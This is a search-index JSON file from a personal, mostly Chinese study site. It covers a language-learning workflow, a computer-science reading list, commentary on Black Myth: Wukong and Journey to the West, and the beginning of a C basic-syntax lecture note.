{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Track","text":"<p>\u738b\u57a0 - \u5f53\u7136\u6211\u5728\u626f\u6de1 \u9020\u5c31\u6211\u4eca\u5929\u7684\u7f16\u7a0b\u80fd\u529b\u548c\u6d1e\u5bdf\u529b\u7684\uff0c\u4e0d\u662f\u51e0\u767e\u4e07\u884c\u7684\u5927\u578b\u9879\u76ee\uff0c\u800c\u662f\u5c0f\u5230\u51e0\u884c\uff0c\u51e0\u5341\u884c\u4e4b\u77ed\u7684\u7ec3\u4e60\u3002\u4e0d\u8981\u5c0f\u770b\u4e86\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u5b83\u4eec\u5c31\u662f\u7f16\u7a0b\u6700\u7cbe\u9ad3\u7684\u4e1c\u897f\u3002\u53cd\u53cd\u590d\u590d\u7422\u78e8\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u4e0d\u65ad\u6539\u8fdb\u548c\u63d0\u70bc\u91cc\u9762\u7684\u7ed3\u6784\uff0c\u78e8\u783a\u81ea\u5df1\u7684\u601d\u7ef4\u3002\u9010\u6e10\u7684\uff0c\u4f60\u7684\u8ba4\u8bc6\u6c34\u5e73\u5c31\u8d85\u8d8a\u4e86\u8fd9\u4e9b\u51e0\u767e\u4e07\u884c\uff0c\u8ba9\u4eba\u5934\u75db\u7684\u9879\u76ee\u3002 </p>"},{"location":"#core","title":"Core","text":"<ul> <li>Input \u2192 Process \u2192 Output     - Input:         - \u542c\u529b<pre><code>  SST \u9898\u5e93\u8bad\u7ec3\u3001Spotify \u9ad8\u8d28\u91cf\u64ad\u5ba2\n\n  - \u53e3\u8bed\n\n  Firefly \u9898\u5e93\u5237\u9898\uff0c\u5355\u8bcd\u672c\u7ea0\u97f3\uff0c\u591a\u542c\u4fdd\u6301\u610f\u7fa4\u8bed\u611f\n\n  - \u5199\u4f5c\n\n  Anki \u79ef\u6512\u4e0b\u7684\u9605\u8bfb\u77ed\u8bed\u548c\u8bcd\u6c47\u8fdb\u884c\u80cc\u8bf5\u4e0e\u7ea0\u6b63\uff0c\u8fdb\u884c\u8bed\u6cd5\u642d\u914d Anki \u518d\u80cc\u8bf5\n\n  - \u9605\u8bfb\n\n  FireFly\u3001\u65b0\u6982\u5ff5\u9605\u8bfb\u8bfb\u672c\u3001\u9ad8\u8d28\u91cf\u7f8e\u56fd\u9ad8\u4e2d\u751f\u6587\u5b66\u3001\u5386\u53f2 Textbook\uff0cReading Firfly \u9898\u5e93\u7ffb\u8bd1\u7406\u89e3\u523b\u610f\u8bad\u7ec3\uff0cReadPaper \u4ee5\u53ca\u6c89\u6d78\u5f0f\u7ffb\u8bd1\u505a\u5bfc\u5165\u8fdb\u884c\u6bb5\u843d\u7cbe\u7ffb\uff0c\u7b14\u8bb0\u5f55\u5165 Anki \u4e2d\u8fdb\u884c\u6458\u7ed9\u51fa\u76f8\u5173\u5f15\u7528\n</code></pre> <p>- Process:       - \u505a\u9519\u7684\u9898\u76ee\u53cd\u590d\u5f55\u5165 MD \u9519\u9898\u672c\uff0c\u6253\u5370\u540e\u81ea\u884c\u6279\u6539       - \u91cd\u590d\uff0cRecursion\uff0c\u5927\u6a21\u5757\u62c6\u89e3\u5c0f\u6a21\u5757\u95ee\u9898\u9010\u4e00\u653b\u7834       - LLM \u5bf9\u4e8e\u5199\u4f5c\u4e0e\u9605\u8bfb\u8fdb\u884c\u5bfc\u5165\u5206\u6790\uff0c\u7ea0\u6b63\u8bed\u6cd5\u3001\u67e5\u8be2\u77ed\u8bed\u642d\u914d       - Anki \u6216\u767d\u7eb8\u65e9\u4e0a\u590d\u4e60\u5de9\u56fa\u3001\u665a\u4e0a\u7761\u524d\u8bb0\u5fc6\u590d\u4e60\uff0c\u7b2c\u4e8c\u5929\u518d\u56de\u5230\u539f\u8bed\u5883\u91cd\u7406\u89e3       - \u542c\u529b Spotify YouTube \u5b9a\u5411\u8bdd\u9898\u63d0\u53d6\u5b57\u5e55\u80cc\u8bf5\u4e0d\u719f\u6089\u7684\u5355\u8bcd\u91cd\u590d\u7406\u89e3\u5f55\u5165 Anki   - Output:       - \u5199\u4f5c</p> <pre><code>  \u8d39\u66fc\u5b66\u4e60\u6cd5\uff0c\u5c06\u9519\u9898\u672c\u4e0e Processed \u63d0\u70bc\u8fc7\u7684\u5355\u8bcd\u4e0e\u8bcd\u7ec4\u642d\u914d\uff0c\u601d\u8003\u8bb0\u5f55\u4e00\u4e9b\u65e5\u8bb0\u5230 Flomo\uff0c\u8bb0\u5f55\u60f3\u6cd5\u3001\u6280\u672f\u7b14\u8bb0\u81f3 Blog \u4e2d\uff0c\u6a21\u62df\u518d\u6b21\u6559\u4f1a\u522b\u4eba\n\n  - **\u53e3\u8bed**\n\n  \u6a21\u62df\u8c08\u8bdd\u3001\u6f14\u8bb2\u6cd5\uff0c\u901a\u8fc7\u8bdd\u9898\u5047\u88c5\u81ea\u5df1\u5728\u8bb2\u8ff0\u4e00\u4e2a\u6545\u4e8b\uff0c\u4ece Anki \u4e0e\u7b14\u8bb0\u4e2d\u627e\u51fa\u8bcd\u6c47\u8fdb\u884c\u4e32\u8054\u8f93\u51fa\uff0c\u8fdb\u884c Record \u5f55\u5236\u540e\u56de\u653e\u81ea\u7ea0\u8bed\u901f\u4e0e\u8bed\u6cd5\u7b49\u95ee\u9898\n</code></pre> <p>- Tools       - \u535a\u5ba2\u9002\u5408\u6587\u79d1\u7c7b\u7684 Abstraction \u518d\u63d0\u70bc\u8f93\u51fa\uff0c\u8fdb\u884c\u6574\u5408\u4fee\u6539       - Flomo \u9002\u5408\u788e\u7247\u5316 Input \u8fdb\u884c Hash Tag \u6807\u6ce8\u6574\u7406\uff0c\u6d41\u6c34\u8d26\u5f0f\u53cd\u601d       - Notion \u9002\u5408\u65e5\u6708\u8fdb\u5ea6\u8ba1\u5212\u3001\u9519\u9898\u672c\u7684\u5efa\u7acb\u6253\u5370\u3001\u535a\u5ba2\u7684 Abstraction \u518d\u8f93\u51fa\u3001\u4eba\u751f\u3001\u516c\u53f8\u5927\u9879\u76ee\u8ba1\u5212\u7684\u5efa\u7acb       - Typora + Docsify + OneDrive \u8bb0\u5f55\u7406\u79d1\u89c4\u6574\u6280\u672f\u7b14\u8bb0\uff0cVisual Studio Code \u63a8\u9001\u81f3 Github - Doing One Thing at a Time - Make a Plan \u2192 Recursion, Break in to small peieces. - \u53cd\u8106\u5f31\uff1a\u81ea\u5df1\u4e3b\u52a8\u7ed9\u81ea\u5df1\u627e\u5b66\u4e60\u4e0a\u7684\u3001\u5065\u8eab\u4e0a\u7684\u82e6\u5934\u5403</p> </li> </ul>"},{"location":"#computer-science","title":"Computer Science","text":""},{"location":"#devops","title":"DevOps","text":"<ul> <li>A Practical Guide to Linux, Editors, and Shell</li> </ul>"},{"location":"#network","title":"Network","text":"<ul> <li>\u56fe\u89e3 HTTP</li> <li>Computer Networking: A Top-Down Approach</li> </ul>"},{"location":"#algorithm","title":"Algorithm","text":"<ul> <li>CSE 101</li> <li>Grokking Algorithms</li> </ul>"},{"location":"#design-model","title":"Design Model","text":"<ul> <li>A Philosophy of Software Design</li> <li>Grokking the System Design Interview</li> </ul>"},{"location":"#data-structures","title":"Data Structures","text":"<ul> <li>Discrete Math</li> <li>OI Wiki - Codewar</li> <li>CSE 100 - Review the knowledge of C and C++</li> </ul>"},{"location":"#distributed-systems","title":"Distributed Systems","text":"<ul> <li>MIT 6.004     - CSE 140     - Computer Architecture - zyBooks</li> <li>MIT 6.824 Distributed Systems</li> <li>MIT 6.S081 Operating System Engineering</li> <li>Computer Systems: A Programmer's Perspective</li> </ul>"},{"location":"#bootcamp","title":"Bootcamp","text":"<ul> <li>The Complete 2023 Web Development Bootcamp</li> <li>100 Days of Code: The Complete Python Pro Bootcamp for 2023</li> </ul>"},{"location":"arts/wukong/","title":"\u897f\u6e38","text":"<p>\u9ed1\u795e\u8bdd\u609f\u7a7a\u6700\u4f4e\u753b\u8d28\u5728 macOS \u4e0a\u6700\u4f4e\u753b\u8d28\u6e38\u73a9\u4e86\u4e09\u5929\u534a\u540e\u5b8c\u6210\u4e86\u6240\u6709\u5267\u60c5\uff0c\u8be6\u60c5\u914d\u7f6e\u65b9\u6cd5\u5728 Wine \u4e00\u6587\u4e2d\uff0c\u5e73\u5e38\u65f6\u95f4\u7528 CrossOver \u505a\u4efb\u4f55\u4e8b\u5b9e\u9645\u4e0a\u90fd\u611f\u89c9\u5f88\u618b\u5c48\uff0c\u56e0\u6b64\u5728\u7ed3\u675f\u6e38\u620f\u540e\u5378\u8f7d\u4e86\u6240\u6709\u865a\u62df\u673a\u914d\u7f6e\uff0c\u91cd\u56de\u73b0\u5b9e\u8e0f\u4e0a\u5c5e\u4e8e\u81ea\u5df1\u7684\u53d6\u7ecf\u4e4b\u8def\u3002\u6e38\u620f\u6d89\u53ca\u7684\u6587\u5316\u548c\u56fe\u9274\u6545\u4e8b\u6700\u4e3a\u5438\u5f15\u4eba\uff0c\u5728\u6b64\u8bb0\u5f55\u4e00\u4e9b\u897f\u6e38\u8bb0\u6587\u5316\u5143\u7d20\u7684\u6458\u6284\u4ee5\u53ca\u89e3\u8bfb\u8d44\u6e90\u3002</p>"},{"location":"arts/wukong/#_2","title":"\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0","text":"<p>gcores.com \u6709\u5f88\u591a\u4f5c\u8005\u5bf9\u6e38\u620f\u5267\u60c5\u548c\u6587\u5316\u6709\u7740\u6df1\u523b\u89e3\u6790\uff0c\u5176\u4e2d\u770b\u5230\u72fc\u5c0f\u660e\u5440\u7528\u300a\u674e\u5353\u543e\u6279\u8bc4\u897f\u6e38\u8bb0\u300b\u4f5c\u4e3a\u5f15\u5b50\u89e3\u6790\u6bcf\u7ae0\u6e38\u620f\u5267\u60c5\u5f88\u662f\u6709\u8da3\uff0c\u65e5\u540e\u6709\u673a\u4f1a\u770b\u4e00\u4e0b\u6279\u8bc4\u8bb0\uff1a</p> <p>\u5b59\u609f\u7a7a\u8ba4\u4e3a\u597d\u7537\u4e0d\u8ddf\u5973\u6597\uff0c\u4e00\u68d2\u5b50\u6253\u6b7b\u5979\u4eec\u6709\u70b9\u6b3a\u8d1f\u4eba\uff0c\u5c31\u73a9\u5fc3\u53c8\u8d77\uff0c\u53d8\u4e86\u53ea\u9e70\uff0c\u5c06\u4e03\u5973\u8863\u670d\u6089\u6570\u53fc\u8d70\u3002\uff08\u6253\u6b7b\u5c31\u6ca1\u540e\u9762\u8fd9\u4e48\u591a\u4e8b\u4e86\uff0c\u53ef\u89c1\u5b59\u609f\u7a7a\u4e5f\u662f\u4e2a\u60f9\u4e8b\u7684\u4e3b\u3002\uff09\u609f\u7a7a\u8fd4\u56de\u4e0e\u516b\u6212\u3001\u6c99\u50e7\u6c47\u5408\uff0c\u516b\u6212\u542c\u8bf4\u5973\u5996\u7cbe\u5728\u6d17\u6fa1\uff0c\u53e3\u79f0\u8981\u53bb\u6253\u6740\u5996\u7cbe\uff0c\u201c\u6296\u64de\u7cbe\u795e\uff0c\u6b22\u5929\u559c\u5730\u4e3e\u7740\u9489\u94af\uff0c\u62fd\u5f00\u6b65\uff0c\u5f84\u76f4\u8dd1\u5230\u90a3\u91cc\u3002\u201d\u5148\u662f\u51fa\u8a00\u8c03\u620f\uff0c\u53c8\u5316\u4f5c\u9cb6\u9c7c\u7cbe\uff0c\u5f80\u5973\u5996\u7cbe\u817f\u95f4\u4e71\u94bb\u3002\uff08\u53e4\u65e9\u9ec4\u6bb5\u5b50\u624b\u674e\u5353\u543e\u5927\u547c\uff1a\u53d8\u5f97\u5999\u554a\uff0c\u53ef\u60dc\u6ca1\u53d8\u4e2a\u6ce5\u9cc5\u9cdd\u9c7c\u4ec0\u4e48\u7684\u3002\uff09 \u201c\u9ec4\u9cdd\u95e8\u201d\u7591\u4f3c\u6709\u4e9b\u843d\u540e\u4e86\u3002\uff08\u674e\u5353\u543e\u8bf4\uff0c\u516b\u6212\u4ece\u6765\u4eb2\u8fd1\u5973\u8272\u6ca1\u6709\u50cf\u8fd9\u6b21\u8fd9\u6837\u4eab\u53d7\u7684\uff0c\u8fd9\u6b21\u662f\u6709\u70b9\u592a\u5f97\u610f\u5fd8\u5f62\u4e86\u3002\uff09\u4e0d\u602a\u540e\u9762\u8718\u86db\u7cbe\u4eec\u5411\u767e\u76ee\u9b54\u541b\u72b6\u544a\u516b\u6212\u201c\u5978\u9a97\u201d\u5979\u4eec\u3002</p> <p>\u4e03\u5996\u7cbe\u6ca1\u8863\u670d\u7a7f\uff0c\u8d64\u6761\u6761\u56de\u6d1e\uff0c\u4ece\u5510\u50e7\u9762\u524d\u7b11\u563b\u563b\u8dd1\u8fc7\u53bb\u3002\uff08\u674e\u5353\u543e\u7b11\u6279\uff1a\u8fd9\u80af\u5b9a\u662f\u5510\u50e7\u751f\u5e73\u672a\u89c1\u3002\u867d\u8179\u4e2d\u7a7a\u7a7a\u4f46\u662f\u5927\u9971\u773c\u798f\uff0c\u5316\u658b\u8fd9\u4e00\u8d9f\u771f\u662f\u4e0d\u865a\u6b64\u884c\u554a\uff01\uff09\u8981\u6211\u8bf4\uff0c\u8001\u674e\u8fd9\u5c31\u8fc7\u5206\u4e86\uff0c\u4ed6\u6015\u662f\u4ee5\u5c0f\u4eba\u4e4b\u5fc3\u5ea6\u541b\u5b50\u4e4b\u8179\u3002\u51b5\u5510\u50e7\u53c8\u4e0d\u662f\u516b\u6212\uff0c\u5c82\u80fd\u4e34\u6b7b\u800c\u4ecd\u56fe\u8272\u4e4e\uff1f\u4e03\u5996\u7cbe\u5524\u6765\u4e03\u4e2a\u5e72\u513f\u5b50\uff0c\u5206\u522b\u662f\u871c\u8702\uff0c\u8682\u8702\uff0c\u8826\u8702\uff0c\u73ed\u6bdb\uff0c\u725b\u8722\uff0c\u62b9\u8721\uff0c\u873b\u8713\uff0c\u8bf7\u4ed6\u4eec\u5e2e\u5fd9\u62b5\u6321\u8ffd\u5175\uff0c\u81ea\u5df1\u5219\u9003\u53bb\u5e08\u5144\u767e\u773c\u9b54\u541b\u5bb6\u3002\u4e03\u4e2a\u5996\u602a\u7684\u5e72\u513f\u5b50\uff0c\u8fd9\u4e00\u9898\u6750\u6216\u4e5f\u53ef\u5728\u6e38\u620f\u91cc\u5927\u4e66\u7279\u4e66\u3002\u4f46\u201c\u6e38\u79d1\u201d\u53ea\u628a\u4ed6\u4eec\u505a\u6210\u4e86\u7b2c\u56db\u7ae0\u91cc\u7684\u4e00\u5e2e\u6742\u5175\u5c0f\u602a\u3002</p>"},{"location":"arts/wukong/#_3","title":"\u5f71\u795e\u56fe","text":"<p>\u5bf9\u6bcf\u4e2a\u4eba\u7269 Biligame \u90fd\u505a\u4e86\u56fe\u9274\u6536\u5f55\uff0c\u6e38\u620f\u4e2d\u7684\u6545\u4e8b\u63cf\u8ff0\u80fd\u591f\u76f4\u63a5\u5728\u8fd9\u4e0a\u9762\u9605\u8bfb\uff0c\u751a\u81f3\u8fd8\u6709\u6e38\u620f\u539f\u672c\u7684\u53f0\u8bcd\u6458\u6284\uff0c\u8003\u636e\uff0c\u6280\u80fd\u62db\u5f0f\u7b49\u3002</p>"},{"location":"arts/wukong/#_4","title":"\u73a9\u540e\u611f","text":"<p>\u7b2c\u4e00\u7ae0\u7684\u91d1\u6c60\u957f\u8001\u548c\u7b2c\u4e09\u7ae0\u7684\u9ec4\u7709\u5927\u738b\u662f\u5168\u5267\u60c5\u4e2d\u6700\u559c\u6b22\u7684\u90e8\u5206\uff0c\u90a3\u79cd\u81ea\u604b\u548c\u504f\u6267\u7b26\u5408\u9ed1\u795e\u8bdd\u7684\u9ed1\u6697\u8bbe\u5b9a\u7684\u540c\u65f6\u4e5f\u5e26\u7ed9\u4e86\u81ea\u5df1\u5bf9\u4e8e\u9ed1\u6697\u4e09\u89d2\u4eba\u683c\u7684\u518d\u601d\u7d22\uff0c\u5267\u4e2d\u9ec4\u7709\u5927\u738b\u7684\u53f0\u8bcd\uff1a</p>"},{"location":"arts/wukong/#_5","title":"\u9ec4\u7709","text":"<p>\u6211\u5728\u5f88\u591a\u5947\u602a\u7684\u68a6\u91cc\uff0c\u89c1\u8fc7\u4f60\u4eec\uff0c\u4f60\u4eec\u56e0\u7f18\u9645\u4f1a\u8d70\u5230\u4e00\u8d77\uff0c\u6000\u7740\u5404\u4e0d\u76f8\u540c\u7684\u76ee\u7684\u3002</p> <p>\u4f60\uff0c\u6b32\u6210\u524d\u4eba\u672a\u7adf\u4e4b\u4e1a\uff0c\u4fee\u529f\u5fb7\u5706\u6ee1\u3002</p> <p>\u4f60\uff0c\u6267\u7740\u540e\u4e16\u4f20\u9882\u4e4b\u540d\uff0c\u6c42\u4f4d\u5217\u4ed9\u73ed\u3002</p> <p>\u4f60\uff0c\u60f3\u8df3\u51fa\u4e09\u754c\u4e4b\u5916\uff0c\u56fe\u4e2a\u6e05\u51c0\u81ea\u5728\u3002</p> <p>\u8fd8\u6709\u4f60\uff0c\u65e0\u6240\u6302\u788d\uff0c\u5403\u987f\u9971\u996d\u4fbf\u5584\u54c9\u5584\u54c9\u3002</p> <p>\u53ef\u6211\uff0c\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u4eec\uff0c\u6ee1\u5634\u7684\u60c5\u6000\u5927\u4e49\uff0c\u4e00\u5fc3\u7684\u4e16\u4fd7\u540d\u5229\uff0c\u5531\u4ec0\u4e48\u547d\u4e0d\u7531\u5929\uff0c\u5374\u7b03\u4fe1\u81ea\u5df1\uff0c\u624d\u662f\u5929\u547d\u4e4b\u9009\u3002</p> <p>\u53ef\u60b2\u7684\u53d6\u7ecf\u4eba\u5450\uff0c\u53ea\u8981\u5fc3\u4e2d\u8fd8\u6709\u653e\u4e0d\u4e0b\u7684\u5076\u50cf\uff0c\u7ec8\u6709\u4e00\u5929\uff0c\u5b83\u5c06\u5316\u4e3a\u4fee\u884c\u8def\u4e0a\u65e0\u89e3\u7684\u4e1a\u969c\u3002</p> <p>\u9ec4\u7709\u5927\u738b\u7684\u8bdd\u771f\u5047\u53c2\u534a\uff0c\u548c\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u81ea\u604b\u8005\u4e00\u6837\u5c06\u4eba\u7684\u672c\u6211\u6df1\u523b\u89e3\u6790\uff0c\u89c9\u5f97\u4f17\u4eba\u7686\u9189\u6211\u72ec\u9192\uff0c\u559c\u6b22\u5e26\u7740\u4eba\u6027\u672c\u6076\u7684\u679c\u53bb\u8bc1\u660e\u56e0\u3002\u548c\u7ae0\u8282\u7ed3\u675f\u540e\u7684\u52a8\u753b\u4e00\u6837\uff0c\u4e00\u65e6\u6709\u4e00\u4e2a\u4eba\u6f0f\u51fa\u6076\u5ff5\uff0c\u4ed6\u5c31\u63a8\u7ffb\u6240\u6709\u66fe\u7ecf\u62e5\u6709\u8fc7\u7684\u7f8e\u597d\u8fc7\u7a0b\uff0c\u5927\u7b11\u91d1\u8749\u5b50\u8bf4\u81ea\u5df1\u53c8\u8d62\u4e86\uff0c\u91d1\u8749\u5b50\u53ea\u662f\u7b11\uff1a\u5e08\u5144\u5982\u6b64\u6267\u7740\u8f93\u8d62\uff0c\u53ef\u7b11\uff0c\u53ef\u60b2</p> <p>\u8fd8\u8bb0\u5f97\u76c2\u5170\u4f1a\u4e0a</p> <p>\u4e16\u5c0a\u8bf4\u8fc7\uff1a\u4f17\u751f\u4e4b\u82e6\uff0c\u591a\u56e0\u4e0d\u5b88\u6212\u5f8b\uff0c\u653e\u60c5\u7eb5\u6b32\u3002</p> <p>\u8981\u6211\u8bf4\uff0c\u653e\u5c41\uff01</p> <p>\u4e0d\u6740\u751f\uff0c\u4ec7\u6068\u6c38\u65e0\u6b62\u606f\uff1b</p> <p>\u4e0d\u5077\u76d7\uff0c\u5f3a\u5f31\u5982\u6211\u4f55\u5f02\uff1b</p> <p>\u4e0d\u90aa\u6deb\uff0c\u4e00\u5207\u6709\u60c5\u7686\u5b7d\uff1b</p> <p>\u4e0d\u5984\u8bed\uff0c\u68a6\u5e7b\u6ce1\u5f71\u7a7a\u865a\uff1b</p> <p>\u4e0d\u998b\u9152\uff0c\u5fe7\u6016\u6da8\u843d\u65e0\u5e38\uff1b</p> <p>\u4e0d\u803d\u4e50\uff0c\u82b3\u534e\u5239\u90a3\u800c\u5df2\uff1b</p> <p>\u4e0d\u8d2a\u7720\uff0c\u82e6\u82e6\u4e0d\u5f97\u89e3\u8131\uff1b</p> <p>\u4e0d\u7eb5\u6b32\uff0c\u8bf8\u884c\u4e86\u65e0\u751f\u8da3</p> <p>\u9ec4\u7709\u5927\u738b\u8fd8\u672a\u5f00\u5ead\u5c31\u5df2\u7ecf\u7ed9\u4e16\u4eba\u5b9a\u7f6a\uff1a</p> <p>\u4e16\u4eba\u7686\u6709\u7f6a\uff0c\u7136\u540e\u5728\u6b64\u57fa\u7840\u4e0a\u50cf\u5ba1\u8baf\u72af\u4eba\u4e00\u6837\u5ba1\u5224\u4f17\u751f\u3002</p> <p>\u4fe1\u4ec0\u4e48\u72d7\u5c41\u5982\u6765\uff0c\u4e0d\u5982\u6211\u81ea\u5df1\u6765\uff01</p> <p>\u5728\u6e38\u620f\u4e2d\u4ed6\u5efa\u7acb\u4e86\u5c0f\u96f7\u97f3\u5bfa\u5927\u96c4\u5b9d\u6bbf\uff0c\u548c\u4e3b\u4eba\u5f25\u52d2\u4f5b\u7684\u5927\u96f7\u97f3\u5bfa\u76f8\u547c\u5e94\uff0c\u626e\u6210\u5f25\u52d2\u7684\u6a21\u6837\u9a97\u53d6\u5927\u91cf\u7684\u671d\u5723\u8005\u548c\u795e\u4f5b\u8fdb\u5bfa\uff0c\u7136\u540e\u7528\u5f25\u52d2\u7684\u540e\u5929\u888b\u88c5\u8fdb\u53bb\u70bc\u5316\u6210\u81ea\u5df1\u7684\u9b54\u5316\u5e72\u5c06\u4e3a\u4ed6\u81ea\u5df1\u800c\u6218\u3002</p> <p>\u6211...\u65e9\u5c31\u770b\u7a7f\u4e86\u4f60\u7684\u4e0b\u573a\uff0c\u53ea\u8981\u4f60\u8fd8\u5728\u4e3a\u4ed6\u4eba\u800c\u6218\uff0c\u5c31\u8fdf\u65e9\u4f1a\u6b7b\u5728\u4ed6\u4eba\u624b\u4e0a\uff0c\u6211\u9ec4\u7709\u53ea\u4e3a\u81ea\u5df1\uff01\u6211\u6ca1\u8f93\uff0c\u6211\u4e0d\u4f1a\u8f93...\u53ea\u8981\uff0c\u53ea\u8981\u518d\u7528\u4e00\u6b21\u90a3\u7334\u5b50\u7684\u5b9d\u8d1d...</p> <p>\u5373\u4f7f\u6218\u8d25\u4ed6\u4e5f\u8ba4\u4e3a\u6211\u547d\u7531\u6211\u4e0d\u7531\u5929\uff0c\u8fd8\u60f3\u518d\u8eab\u4efd\u76d7\u7a83\u4e00\u6b21\u5176\u4ed6\u4f5b\u7684\u6cd5\u5b9d\u7136\u540e\u7ee7\u7eed\u4f5c\u6218\u3002\u771f\u7684\u5f25\u52d2\u4f5b\u51fa\u73b0\u540e\u89e3\u91ca\u9053\uff1a</p> <p>\u4ed6\u539f\u672c\u662f\u4e1c\u6765\u4f5b\u7956\u5f25\u52d2\u4f5b\u9762\u524d\u53f8\u78ec\u7684\u4e00\u4e2a\u9ec4\u7709\u7ae5\u5b50\uff0c\u8d81\u5f25\u52d2\u4f5b\u4e0d\u5728\u5bab\u91cc\u5077\u4e86\u51e0\u4ef6\u5b9d\u8d1d\uff0c\u5728\u5c0f\u897f\u5929\u5047\u4f5b\u6210\u7cbe\u3002</p> <p>\u800c\u6e38\u620f\u4e2d\u5df2\u662f\u7b2c\u4e8c\u6b21\u76d7\u53d6\u4ed6\u7684\u540e\u5929\u888b\uff0c\u5728\u501f\u5927\u5723\u4e4b\u529b\u628a\u888b\u5b50\u70bc\u6210\u4e86\u9500\u9b42\u593a\u9b44\u7684\u90aa\u5b9d\uff0c\u7136\u540e\u5316\u4f5c\u5f25\u52d2\u4f5b\u7684\u6a21\u6837\u501f\u673a\u62a5\u590d\u5f53\u5e74\u6536\u590d\u4ed6\u7684\u4ec7\u4eba</p> <p>\u8be5\u4eba\u7269\u548c\u4f4e\u529f\u80fd NPD \u4e00\u6837\u5584\u4e8e PUA \u548c\u8a00\u8bed\u64cd\u7eb5\uff0c\u5229\u7528\u6ed1\u5761\u8c2c\u8bef\u548c\u7834\u7a97\u6548\u5e94\u5047\u88c5\u5f3a\u5927\u5b9e\u9645\u5f31\u5c0f\u7684\u81ea\u5df1\uff0c\u538c\u6076\u4e16\u4eba\u7684\u672c\u6211\u4f46\u81ea\u5df1\u8eab\u4e0a\u7684\u672c\u6211\u5374\u4f53\u73b0\u7684\u73b2\u79bb\u5c3d\u81f4</p>"},{"location":"arts/wukong/#_6","title":"\u91d1\u6c60\u957f\u8001","text":"<p>\u4e3a\u4e86\u51e0\u4ef6\u8863\u670d\u5c06\u9ec4\u7709\u63d0\u51fa\u7684\u5bf9\u5916\u7269\u7684\u6267\u5ff5\u53d1\u6325\u5230\u4e86\u6781\u81f4\u3002</p> <p>\u6839\u636e\u52a8\u753b\u9ed1\u98ce\u5c71\u91d1\u6c60\u957f\u8001\u5728\u6210\u957f\u8fc7\u7a0b\u4e2d\u8ba4\u8bc6\u4e86\u9ed1\u718a\u7cbe\uff0c\u9ed1\u718a\u7cbe\u5e76\u6ca1\u6709\u6740\u5bb3\u4ed6\u3002</p> <p>\u5728\u539f\u8457\u4e2d\u9ed1\u718a\u7cbe\u4e3b\u52a8\u5b66\u4e60\u4f5b\u6cd5\u6700\u540e\u611f\u52a8\u4e86\u83e9\u8428\u505a\u4e86\u5b88\u5c71\u5927\u795e\uff0c\u6709\u4eba\u731c\u60f3\u662f\u4ed6\u4f20\u6388\u4e86\u91d1\u6c60\u957f\u8001\u957f\u751f\u4e0d\u8001\u4e4b\u672f\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u8fd9\u53e5\u53f0\u8bcd\uff1a</p> <p>\u6211\u4eca\u5e74\u4e8c\u767e\u4e03\u5341\u5c81\uff0c\u7a7a\u6323\u4e86\u51e0\u767e\u4ef6\u8888\u88df\uff0c\u600e\u4e48\u5f97\u6709\u4ed6\u8fd9\u4e00\u4ef6\uff1f</p> <p>\u5176\u4ed6\u9ed1\u98ce\u5c71\u5168\u5267\u60c5\u53ef\u53c2\u8003 B \u7ad9\u535a\u4e3b\u5ddd\u540c\u5b66\u4e0d\u7a7f\u7ae5\u978b\u89e3\u6790</p>"},{"location":"cs/c/2.1/","title":"2.1 Basic Syntax","text":""},{"location":"cs/c/2.1/#mon-lecture","title":"Mon Lecture","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n/* Compile this program with:\n   cc -std=c11 -Wall -Werror -o rotate rotate.c\n */\n\n#define ROT 13\n\nstatic char rotate(char c)\n{\n    c = c + ROT;\n    return c;\n}\n\nint main(int argcount, char *argvalue[])\n{\n    // check the number of arguments\n    if(argcount != 2) {\n        exit(EXIT_FAILURE);\n    }\n    else {\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <ul> <li>C11 \u63d0\u4f9b\u4e24\u79cd\u7c7b\u578b\u7684 comments</li> </ul> <pre><code>/* block comments */\n// comments to the end of a line\n</code></pre> <ul> <li>main \u51fd\u6570\u6267\u884c\uff0c\u91cc\u9762\u7684\u53c2\u6570\u53eb args</li> </ul> <ul> <li>\u5f00\u5934\u7684 <code>#define</code> \u539f\u7406\u5982\u4e0b\uff1a</li> </ul> <p>\u5f53 C \u7f16\u8bd1\u5668\u9047\u5230 #define \u6307\u4ee4\u65f6\uff0c\u4f1a\u5728\u4ee3\u7801\u4e2d\u7528\u8be5\u5e38\u91cf\u6216\u5b8f\u7684\u503c\u66ff\u6362\u6bcf\u6b21\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> <p>\u5728\u4f60\u7684\u4ee3\u7801\u7247\u6bb5\u4e2d\uff0c#define ROT 13 \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a ROT\uff0c\u503c\u4e3a 13 \u7684\u5b8f\u3002\u56e0\u6b64\uff0c\u6bcf\u5f53\u4ee3\u7801\u4e2d\u51fa\u73b0 ROT \u65f6\uff0c\u5b83\u5c06\u88ab\u66ff\u6362\u4e3a 13\u3002</p> <ul> <li><code>#include</code></li> </ul> <p><code>#include</code> \u6307\u4ee4\u7528\u4e8e\u5728\u4f60\u7684 C \u7a0b\u5e8f\u4e2d\u5305\u542b\u5916\u90e8\u6587\u4ef6\u3002\u88ab\u5305\u542b\u6587\u4ef6\u7684\u5185\u5bb9\u4f1a\u88ab\u63d2\u5165\u5230 <code>#include</code> \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002</p> <p>\u4f8b\u5982\uff0c<code>#include &lt;stdio.h&gt;</code> \u5728\u4f60\u7684\u7a0b\u5e8f\u4e2d\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\uff0c\u4f7f\u4f60\u80fd\u591f\u4f7f\u7528 printf\u3001scanf \u7b49\u51fd\u6570\u3002</p> <p>\u5f53\u4f60\u8fd0\u884c C 